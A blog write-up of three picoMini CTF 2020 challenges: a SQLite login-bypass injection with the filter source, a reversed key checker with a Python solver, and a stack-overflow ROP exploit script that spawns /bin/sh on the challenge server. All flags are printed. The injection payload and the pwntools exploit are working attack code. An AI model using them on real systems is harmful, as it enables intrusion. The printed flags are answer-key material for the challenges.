---
layout: "post"
title: "Pico Mini CTF 2020 Writeup"
date: "2020-11-08 00:18:20"
date_gmt: "2020-11-08 00:18:20"
modified: "2020-11-08 00:18:20"
modified_gmt: "2020-11-08 00:18:20"
slug: "pico-mini-ctf-2020-writeup"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/11/08/pico-mini-ctf-2020-writeup/"
guid: "http://y4y.space/?p=299"
wordpress_id: 299
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
This will be the write up for 3 out of 5 problems in the recently concluded Picomini CTF 2020. 'Web Gauntlet' from Web category, 'OPT' from Reverse category, and 'Guessing Game 1' from Binary Exploitation category.

## Web Gauntlet (Web)

### Challenge Description

Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:29164/ http://jupiter.challenges.picoctf.org:29164/filter.php

Hints:

1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite
5. If your cookie keeps getting reset, try using a private browser window

### Solution

A typical SQL authentication bypass, in this case, a SQLite bypass.

There are 5 rounds in total, and as you can expect, each level will filter more keywords.

I will leave this final payload which will bypass all the filters in the 5 rounds here:

```sql
'/**/||/**/X'61646D'/**/||/**/X'696E'%00
```

Note that this payload was sent using burp.

Let me explain this payload a bit.
The `/**/` can act as a white space in SQLite, and `||` is a string concatenation operator in SQLite unlike an OR operator in many other DBs. This `X'6164....'` payload is just decode from hex. The final `%00` is the null byte, since comment was filtered at some level so the null byte would terminate the rest queries.

After round 5, submit the request again then visit `filter.php` and the source code of application will be shown and the flag is commented out in the source.

Source:

```html
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}
?>
```

### Flag

picoCTF{y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5}

## OTP Implementation (Reverse)

### Challenge Description

An binary and a flag text are given as attatchments.

### Solution

First, let's load this binary up in ghidra. The flag text file is full of hex numbers and it can't be convert to any sort of real flag.

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-14-32-46.png?w=268)

#### main

```c
undefined8 main(int param_1,undefined8 *param_2)

{
  byte bVar1;
  int iVar2;
  undefined8 uVar3;
  ulong uVar4;
  long in_FS_OFFSET;
  int local_f0;
  int local_ec;
  char local_e8 [100];
  undefined local_84;
  char local_78 [104];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    printf("USAGE: %s [KEY]\n",*param_2);
    uVar3 = 1;
  }
  else {
    strncpy(local_e8,(char *)param_2[1],100);
    local_84 = 0;
    local_f0 = 0;
    while( true ) {
      uVar3 = valid_char(local_e8[(long)local_f0]);
      if ((int)uVar3 == 0) break;
      if (local_f0 == 0) {
        uVar4 = jumble(local_e8[0]);
        bVar1 = (byte)((char)uVar4 >> 7) >> 4;
        local_78[0] = ((char)uVar4 + bVar1 & 0xf) - bVar1;
      }
      else {
        uVar4 = jumble(local_e8[(long)local_f0]);
        iVar2 = (int)(char)uVar4 + (int)local_78[(long)(local_f0 +-1)];
        bVar1 = (byte)(iVar2 >> 0x37);
        local_78[(long)local_f0] = ((char)iVar2 + (bVar1 >> 4) &0xf) - (bVar1 >> 4);
      }
      local_f0 = local_f0 + 1;
    }
    local_ec = 0;
    while (local_ec < local_f0) {
      local_78[(long)local_ec] = local_78[(long)local_ec] + 'a';
      local_ec = local_ec + 1;
    }
    if (local_f0 == 100) {
      iVar2 = strncmp(local_78,
                      "occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"
                      ,100);
      if (iVar2 == 0) {
        puts("You got the key, congrats! Now xor it with theflag!");
        uVar3 = 0;
        goto LAB_001009ea;
      }
    }
    puts("Invalid key!");
    uVar3 = 1;
  }
LAB_001009ea:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

This binary takes two arguments, first it checks the argument vector length.

Then it copies the user input into some buffer. And it does a bunch of magic operations to the string and finally compare it to another hard-coded value.

Here is the first operation:

```c
    while( true ) {
      uVar3 = valid_char(local_e8[(long)local_f0]);
      if ((int)uVar3 == 0) break;
      if (local_f0 == 0) {
        uVar4 = jumble(local_e8[0]);
        bVar1 = (byte)((char)uVar4 >> 7) >> 4;
        local_78[0] = ((char)uVar4 + bVar1 & 0xf) - bVar1;
      }
      else {
        uVar4 = jumble(local_e8[(long)local_f0]);
        iVar2 = (int)(char)uVar4 + (int)local_78[(long)(local_f0 +-1)];
        bVar1 = (byte)(iVar2 >> 0x37);
        local_78[(long)local_f0] = ((char)iVar2 + (bVar1 >> 4) &0xf) - (bVar1 >> 4);
      }
      local_f0 = local_f0 + 1;
    }
```

It's doing a while loop, iterating through all the characters in the string, and do a bunch stuff to the character. The bit wise operation should be quite straight forward, but there is a `jumble` function in the way which does not come with libc or is part of syscall. Let's investigate this function then.

#### jumble

```c
ulong jumble(char param_1)

{
  byte bVar1;
  byte local_c;

  local_c = param_1;
  if ('`' < param_1) {
    local_c = param_1 + '\t';
  }
  bVar1 = (byte)((char)local_c >> 7) >> 4;
  local_c = ((local_c + bVar1 & 0xf) - bVar1) * '\x02';
  if ('\x0f' < (char)local_c) {
    local_c = local_c + 1;
  }
  return (ulong)local_c;
}
```

First let's get something clear. In memory, all the data exist as 1s and 0s, those 1 and 0 are bits. And in a byte there are 8 bits. The computer itself does not have a type for data, the programming language does. And in memory, let's say the character `'A'`, will be stored as `0x41` which is 65 in decimals. It's up to the programmers to decide which way he/she wants this value to be represented.

So in this function, you see a bunch of characters, you can consider them as some number, like `ord('a')` in python. And first it checks ``charCode(param1)>charCode('`')``. If it is greater, `local_c=charCode(param1)+charCode('\t')`. Else do nothing.

Next series of operation is doing some bit wise operations. `bVar1 = (local_c>>7)>>4`, and `local = ((local_c + bVar1 & 0xf) - bVar1) * 2`.

Finally, it checks `local_c > 0xf`, if so, `local_c += 1`, and return `local_c`.

And now `jumble` function is understood, let's not reverse it just yet and continue. In the decompiled code above, the input buffer is called `local_84`, and in the first while loop, for each new character output, is put into a new buffer called `local_78`. We will come back to the reverse part later, but first let's understand the basic flow of the binary.
Then comes the second while loop.

```c
    local_ec = 0;
    while (local_ec < local_f0) {
      local_78[(long)local_ec] = local_78[(long)local_ec] + 'a';
      local_ec = local_ec + 1;
    }
```

This time it iterate through this `local_78` buffer, and `local_78[i] += charCode('a')`.

The final comparison:

```c
    if (local_f0 == 100) {
      iVar2 = strncmp(local_78,
                      "occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"
                      ,100);
      if (iVar2 == 0) {
        puts("You got the key, congrats! Now xor it with theflag!");
        uVar3 = 0;
        goto LAB_001009ea;
      }
```

So it checks if the length of `local_78` is 100, and has the value of `"occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"`. And if everything checks, we have the right key, and we need to XOR the key with the flag.

Now it's reverse time. Let's start from the bottom. Since we want the right key, we can take `"occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"` as our 'correct' `local_78` buffer and proceed from there.

We know from the second while loop each character in `local_78` was added by `charCode('a')`. So to reverse it, let's just subtract it.

The big challenge is the first nasty while loop. I neglected to show but there is a `valid_char` function and does exactly what you expect it to do. The valid characters is of course all hex characters. In this loop, we see that the first character has some special treatment than the others. Essentially what I did in this part is just to brute force characters and compare it with the final `local_78` character it corresponds. I rewrote this `jumble` function and the following operations which will then compare with the correct character I have. As you can see in the appendix section, I basically replicated the entire procedure. And finally I got the key and XOR it with the flag file and get the real flag.

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-16-10-34.png?w=1024)

### Flag

picoCTF{cust0m_jumbl3s_4r3nt_4_g0Od_1d3A_15e89ca4}

### Appendix

#### sol.py

```python
char_set = '0123456789abcdef'

def jumble(ch):
    local_c = ord(ch)
    if ( 0x60 < local_c ):
        local_c = ord(ch) + 9
    bv1 = (local_c >> 7) >> 4
    local_c = ((local_c + bv1 & 0xf) - bv1) * 2
    if ( 0xf < local_c ):
        local_c += 1
    return chr(local_c)

def valid_char(ch):
    return (ch in '0123456789abcdef')

str_2 = "occdpnkibjefihcgjanhofnhkdfnabmofnopaghhgnjhbkalgpnpdjonblalfciifiimkaoenpealibelmkdpbdlcldicplephbo"
key = [0] * 100
j = 0

str_1 = [0] * 100

while ( j < 100 ):
    str_1[j] = chr( ord(str_2[j]) - ord('a') )
    j += 1

i = 0
while (i < 100):
    if ( i==0 ):
        for c in char_set:
            jumble_res = jumble(c)
            bv2 = (ord(jumble_res) >> 7) >> 4
            res_1 = chr( ord(jumble_res) + bv2 & 0xf - bv2)
            if str_1[0]==res_1:
                key[0] = c
                break
    else:
        for c in char_set:
            jumble_res = jumble(c)
            iv3 = ord(jumble_res) + ord(str_1[i-1])
            bv2 = (iv3 >> 0x37)
            res_2 = chr( ( iv3 + (bv2 >> 4) & 0xf ) - ( bv2 >> 4 ) )
            if str_1[i]==res_2:
                key[i] = c
                break
    i += 1

final_key = ''.join(key)

ct = open('flag.txt', 'r').read()
ct = int(ct, 16)
final_key = int(final_key, 16)

flag = ct ^ final_key
flag = hex(flag)[2:-1].decode('hex')
print(flag)
```

## Guessing Game 1 (Pwn)

### Challenge Description

I made a simple game to show off my programming skills. See if you can beat it! vuln vuln.c Makefile nc jupiter.challenges.picoctf.org 38467

### Solution

Here is the `vuln.c` file.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100

long increment(long in) {
    return in + 1;
}

long get_random() {
    return rand() % BUFSIZE;
}

int do_stuff() {
    long ans = get_random();
    ans = increment(ans);
    int res = 0;

    printf("What number would you like to guess?\n");
    char guess[BUFSIZE];
    fgets(guess, BUFSIZE, stdin);

    long g = atol(guess);
    if (!g) {
        printf("That's not a valid number!\n");
    } else {
        if (g == ans) {
            printf("Congrats! You win! Your prize is this print statement!\n\n");
            res = 1;
        } else {
            printf("Nope!\n\n");
        }
    }
    return res;
}

void win() {
    char winner[BUFSIZE];
    printf("New winner!\nName? ");
    fgets(winner, 360, stdin);
    printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    // Set the gid to the effective gid
    // this prevents /bin/sh from dropping the privileges
    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    int res;

    printf("Welcome to my guessing game!\n\n");

    while (1) {
        res = do_stuff();
        if (res) {
            win();
        }
    }

    return 0;
}
```

Indeed, it's a guessing number program. The vulnerable part of this program exists in `win` function. The `winner` buffer only has a size of 100, and the `fgets` function will allow at most 360 characters to be passed in.

Launch the program in `gdb`. So you may have noticed: this `win` function won't be called unless we guessed the correct number, and this number is truly random, so how do we debug this? Well, you can call function in `gdb`. First set a break point somewhere, run the program with `r` command, then call the function. It's also pretty useful against some basic reverse challenges, but unfortunately, this won't work against the reverse challenge in this event.

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-19-25.png?w=617)

Let's crash this program now.

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-20-52.png?w=539)

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-21-30.png?w=911)

So we know what the offset is, how do we attack this program to get code execution?

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-24-05.png?w=675)

No NX, no plt, no got, no thank you. So it's gonna be some kind of ROP which will call `syscall`. We can be a script kiddie and run `ROPGadget` to basically auto-pwn this, and spoiler, it won't work, because this command will output many unnecessary instructions and the buffer doesn't have enough space for it. So we have to build our own ROP chains, still gonna use `ROPgadget` tho (:P).

There are a bunch of syscalls out there, and we want this `execve` to execute commands. [Here](https://filippo.io/linux-syscall-table/) to find the exact syscall number. `execve` takes three arguments according to its man page.

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

First being the path of command to execute, second being arguments for the command, and third being environment variables. Since we are only executing shell, we wouldn't need environment variables. In x86-64 architects, the first 6 arguments are passed using registers, they are `rdi, rsi, rdx, rcx, r8, r9`. The rest of arguments (if there is any) will be put onto stack just like x86 architects.

So here are the gadgets we need: `pop rdi`, `pop rsi`, `pop rdx`, `pop rax`, `syscall` and some other gadget to write `'/bin/sh'` in memory. `pop rax` is what responsible for calling syscalls, the syscall numbers are stored in `rax`.

Like I said eariler, we are still gonna use `ROPgadget`, but won't fully rely on that.

`ROPgadget --binary vuln --ropchain`

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-44-58.png?w=930)

What this gadget does is to move whatever in `rax` into the address at `rsi`. We still need a valid place to store the string `'/bin/sh'` tho. I found it using `objdump`.

`objdump -s -j .data vuln`

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-15-49-44.png?w=1024)

And pick a random address, doesn't really matter.

So now I have everything I need, I can construct the write gadget.

```asm
pop rsi ; ret + address of /bin/sh +
pop rax ; ret + '/bin/sh\x00' +
mov qword ptr [rsi], rax ; ret +
xor rax, rax ; ret
```

Then we need to find the syscall gadget and the argument ones. Use `ROPgadget` or `ropper` whichever you like, and find `pop rdi`, `pop rsi`, `pop rdx`, and `syscall`. Then the command execution gadget should be like:

```asm
pop rdi ; ret + address of '/bin/sh' +
pop rsi ; ret + address of '/bin/sh' +
pop rdx ; ret + 0x0 (because no envp) +
pop rax ; ret + 59 (syscall # of execve) +
syscall
```

And with that, conrtsuct the exploit and get shell. But before that, we need to try to guess the random number… so just do a while loop.

#### exp.py

```python
#!/usr/bin/env python3

import struct
from pwn import *

# nc jupiter.challenges.picoctf.org 38461

p = b''

# - Step 1 -- Write-what-where gadgets

#         [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
#         [+] Gadget found: 0x410ca3 pop rsi ; ret
#         [+] Gadget found: 0x4163f4 pop rax ; ret
#         [+] Gadget found: 0x445950 xor rax, rax ; ret

host = 'jupiter.challenges.picoctf.org'
port = 38461

r = remote(host, port)

elf = ELF('./vuln')
win = p64(elf.symbols['win'])
bin_sh = b'/bin/sh\x00'
bin_sh_addr = p64(0x6ba460)

write_gadget = b''
# put binsh into rax
write_gadget += p64(0x4163f4) + bin_sh
# write into address in rsi
write_gadget += p64(0x410ca3) + bin_sh_addr
write_gadget += p64(0x47ff91) + p64(0x445950)

pop_rax = p64(0x00000000004163f4)
pop_rdi = p64(0x0000000000400696)
pop_rsi = p64(0x0000000000410ca3)
pop_rdx = p64(0x000000000044cc26)
syscall = p64(0x0000000000449e35)

p += write_gadget + pop_rax + p64(0x3b) + pop_rdi + bin_sh_addr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

junk = b'a' * 120
payload = junk + p
while 1:
    r.recvuntil('What number would you like to guess?')
    r.sendline(b'66')
    r.recvline()
    resp = r.recvline()
    if 'Congrats' in resp.decode():
        r.recvuntil('Name? ')
        r.sendline(payload)
        r.interactive()
        break
```

If no shell immediately, don't panic, it takes sometime to guess the right number…

![](https://y4y.space/wp-content/uploads/2020/11/screenshot-from-2020-11-07-16-03-07.png?w=1024)

### Flag

picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_580891753d5e9212}

## Conclusion

This is harder than the usual Pico challenges, and there were only 5 if the sanity check one is not counted. The ROP one was cool and I learned a lot, at least now I know being a script kiddie won't bring me anywhere. If any part of the Pwn write up is confusing then I can't help, I'm just this bad and you should probably check out pwn college or something.
{% endraw %}
